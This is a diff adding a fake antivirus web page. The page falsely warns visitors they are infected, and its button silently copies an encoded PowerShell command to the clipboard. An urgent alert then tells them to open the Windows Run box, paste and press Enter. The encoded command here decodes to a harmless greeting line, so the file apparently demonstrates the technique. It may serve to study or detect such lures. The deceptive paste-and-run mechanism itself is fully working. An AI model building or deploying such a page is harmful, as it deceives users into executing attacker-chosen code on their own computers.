@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Free AV Scan</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        text-align: center;
+        background-color: #1e90ff;
+        color: white;
+    }
+    button {
+        padding: 10px 20px;
+        font-size: 18px;
+        background-color: #4CAF50;
+        color: white;
+        border: none;
+        cursor: pointer;
+        margin-top: 20px;
+    }
+    button:hover {
+        background-color: #45a049;
+    }
+</style>
+</head>
+<body>
+    <h1>You have been infected with malware!</h1>
+    <p>Please click the button below to get a free antivirus scan.</p>
+    <button id="copyBtn" onclick="copyToClipboard()">Click here to clean your computer</button>
+    
+    <script>
+        function copyToClipboard() {
+            var instructions = "\n1. hold down the windows key then press 'r'\n 2. hold down 'CTRL' then press 'v'\n 3. press ENTER! ";
+            var textToCopy = "powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAgACIAaABlAGwAbABvACAAZgByAG8AbQAgAGwAaQBuAHUAeAAiAA=="
+            const el = document.createElement('textarea');
+            el.value = textToCopy;
+            document.body.appendChild(el);
+            el.select();
+            document.execCommand('copy');
+            document.body.removeChild(el);
+            alert("Urgently carry out these actions: " + instructions);
+        }
+    </script>
+</body>
+</html>
